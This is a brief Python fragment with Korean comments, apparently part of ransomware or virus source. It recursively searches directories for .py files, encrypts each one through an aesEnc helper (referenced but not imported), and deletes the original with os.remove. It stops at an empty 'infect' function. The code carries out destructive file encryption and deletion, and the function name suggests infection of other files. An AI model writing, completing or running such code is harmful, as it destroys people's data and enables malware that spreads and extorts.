import os, glob, sys

def searchEncFile(path):
    for filename in glob.iglob(path, recursive = True):
        if os.path.isfile(filename):
            if ".py" in filename:
                print('Encrypting> ' + filename) # 파일명 출력
                aesEnc.makeEncInfo(filename)
                aesEnc.enc(filename) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
                os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
        elif os.path.isdir(filename):
            searchEncFile(filename + '\\*')

def infect(filename):
